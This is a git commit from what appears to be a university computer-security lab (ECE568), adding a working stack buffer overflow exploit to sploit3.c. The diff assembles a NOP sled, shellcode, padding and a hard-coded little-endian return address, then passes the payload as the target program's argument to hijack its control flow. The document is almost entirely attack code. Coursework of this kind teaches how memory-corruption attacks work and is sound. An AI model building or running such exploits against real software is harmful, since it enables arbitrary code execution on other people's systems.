d81657199a285cac8f59443d88285c93124a96b2
Junyu  Ma <majunyu@remote.ecf.utoronto.ca>
2024-01-30 19:45:25 -0500

    target3 hacked

--- ECE568-lab1/sploits/sploit3.c
+++ ECE568-lab1/sploits/sploit3.c
@@ -12,8 +12,40 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
+	char NOP[] = "\x90";
+
+	char exploit[512];
+
+	//buf is 64byte long
+
+	//16 bytes
+	strcpy(exploit, NOP);
+	for(int i=0;i<15;i++){
+		strcat(exploit, NOP);
+	}
+
+	//45bytes
+	strcat(exploit, shellcode);
+
+	//now, exploit is 16+45=61byte long
+	//fill the rest 62-64 byte with NOP
+
+	for(int i = 61; i < 64; i++){
+		strcat(exploit, NOP);
+	}
+
+	//now fill the return address we want
+	//address of buf is 0x3021fe50
+	for(int i = 0; i < 2; i++){
+		strcat(exploit, "\x50\xfe\x21\x30");  //due to little endian, have to fill backwards
+	}
+
+
+
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	//args[1] = "hi there";
+	args[1] = exploit;
 	args[2] = NULL;
 
 	env[0] = NULL;
